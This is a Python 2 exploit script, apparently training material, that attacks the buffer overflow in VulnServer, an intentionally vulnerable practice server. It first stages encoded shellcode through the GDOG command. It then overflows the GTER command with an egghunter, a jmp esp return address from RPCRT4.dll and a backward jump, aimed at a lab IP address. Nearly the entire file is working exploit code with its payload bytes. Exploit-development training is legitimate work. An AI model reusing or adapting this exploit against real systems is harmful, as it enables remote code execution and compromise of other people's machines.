# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer.

# 0x77ef6e7e : jmp esp |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6477 (C:\WINDOWS\system32\RPCRT4.dll)
# Jump backwards 151 bytes
# nasm > jmp $-147
# 00000000  E968FFFFFF        jmp 0xffffff6d


import socket


eggHunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

scode =  ""
scode += "\xbd\x47\xfc\x67\x35\xda\xc3\xd9\x74\x24\xf4\x58\x2b"
scode += "\xc9\xb1\x56\x31\x68\x13\x03\x68\x13\x83\xe8\xbb\x1e"
scode += "\x92\xc9\xab\x5d\x5d\x32\x2b\x02\xd7\xd7\x1a\x02\x83"
scode += "\x9c\x0c\xb2\xc7\xf1\xa0\x39\x85\xe1\x33\x4f\x02\x05"
scode += "\xf4\xfa\x74\x28\x05\x56\x44\x2b\x85\xa5\x99\x8b\xb4"
scode += "\x65\xec\xca\xf1\x98\x1d\x9e\xaa\xd7\xb0\x0f\xdf\xa2"
scode += "\x08\xbb\x93\x23\x09\x58\x63\x45\x38\xcf\xf8\x1c\x9a"
scode += "\xf1\x2d\x15\x93\xe9\x32\x10\x6d\x81\x80\xee\x6c\x43"
scode += "\xd9\x0f\xc2\xaa\xd6\xfd\x1a\xea\xd0\x1d\x69\x02\x23"
scode += "\xa3\x6a\xd1\x5e\x7f\xfe\xc2\xf8\xf4\x58\x2f\xf9\xd9"
scode += "\x3f\xa4\xf5\x96\x34\xe2\x19\x28\x98\x98\x25\xa1\x1f"
scode += "\x4f\xac\xf1\x3b\x4b\xf5\xa2\x22\xca\x53\x04\x5a\x0c"
scode += "\x3c\xf9\xfe\x46\xd0\xee\x72\x05\xbc\xc3\xbe\xb6\x3c"
scode += "\x4c\xc8\xc5\x0e\xd3\x62\x42\x22\x9c\xac\x95\x33\x8a"
scode += "\x4e\x49\xfb\xdb\xb0\x6a\xfb\xf2\x76\x3e\xab\x6c\x5e"
scode += "\x3f\x20\x6d\x5f\xea\xdc\x67\xf7\xd5\x88\x79\xe7\xbe"
scode += "\xca\x79\xf6\x62\x43\x9f\xa8\xca\x03\x30\x09\xbb\xe3"
scode += "\xe0\xe1\xd1\xec\xdf\x12\xda\x27\x48\xb8\x35\x91\x20"
scode += "\x55\xaf\xb8\xbb\xc4\x30\x17\xc6\xc7\xbb\x9d\x36\x89"
scode += "\x4b\xd4\x24\xfe\x2b\x16\xb5\xff\xd9\x16\xdf\xfb\x4b"
scode += "\x41\x77\x06\xad\xa5\xd8\xf9\x98\xb6\x1f\x05\x5d\x8e"
scode += "\x54\x30\xcb\xae\x02\x3d\x1b\x2e\xd3\x6b\x71\x2e\xbb"
scode += "\xcb\x21\x7d\xde\x13\xfc\x12\x73\x86\xff\x42\x27\x01"
scode += "\x68\x68\x1e\x65\x37\x93\x75\xf5\x30\x6b\x0b\xd2\x98"
scode += "\x03\xf3\x62\x19\xd3\x99\x62\x49\xbb\x56\x4c\x66\x0b"
scode += "\x96\x47\x2f\x03\x1d\x06\x9d\xb2\x22\x03\x43\x6a\x22"
scode += "\xa0\x58\x9d\x59\xc9\x5f\x5e\x9e\xc3\x3b\x5f\x9e\xeb"
scode += "\x3d\x5c\x48\xd2\x4b\xa3\x48\x61\x43\x96\xed\xc0\xce"
scode += "\xd8\xa2\x13\xdb"


cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.223',9999))
print cnct.recv(1024)

evilString = "GDOG " + "YCSCYCSC" + scode

cnct.send(evilString)

cnct.close()


cnct = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
cnct.connect(('192.168.1.223',9999))
print cnct.recv(1024)

evilString = "GTER /.:/" + "\x90" * 10 + eggHunter + "\x90" * 105 + "\x7e\x6e\xef\x77" + "\xE9\x64\xFF\xFF\xFF"

cnct.send(evilString)

cnct.close()

